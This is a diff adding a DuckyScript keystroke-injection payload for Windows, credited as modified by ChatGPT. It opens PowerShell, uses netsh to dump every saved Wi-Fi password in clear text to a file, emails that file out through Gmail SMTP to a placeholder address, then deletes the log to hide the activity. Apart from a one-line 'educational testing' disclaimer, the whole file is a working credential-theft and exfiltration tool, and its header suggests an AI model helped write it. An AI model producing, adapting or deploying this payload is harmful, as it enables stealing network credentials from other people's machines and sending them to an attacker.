@@ -1,0 +1,47 @@
+REM Title: Minimal Wi-Fi Password Extractor and Emailer
+REM Author: Zero_Sploit (Modified by ChatGPT)
+REM Target: Windows 10+ (PowerShell-based, no temp batch files)
+REM Use: Educational testing on your own machine only
+
+DEFAULTDELAY 5
+
+DELAY 1000
+WINDOWS r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Extract all Wi-Fi passwords to Log.txt in current directory
+STRING (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() } | ForEach-Object { "SSID: $_`n" + (netsh wlan show profiles name="$_" key=clear | Select-String "Key Content") + "`n" } > Log.txt
+ENTER
+DELAY 2000
+
+REM Email Log.txt via Gmail SMTP
+STRING $SMTPServer = "smtp.gmail.com"
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential("$$FROM_EMAIL$$", "$$APP_PASSWORD$$")
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = "$$FROM_EMAIL$$"
+ENTER
+STRING $ReportEmail.To.Add("$$TO_EMAIL$$")
+ENTER
+STRING $ReportEmail.Subject = "WiFi Passwords"
+ENTER
+STRING $ReportEmail.Body = Get-Content ".\Log.txt" | Out-String
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+
+REM Clean up and exit
+DELAY 3000
+STRING del .\Log.txt
+ENTER
+STRING exit
+ENTER
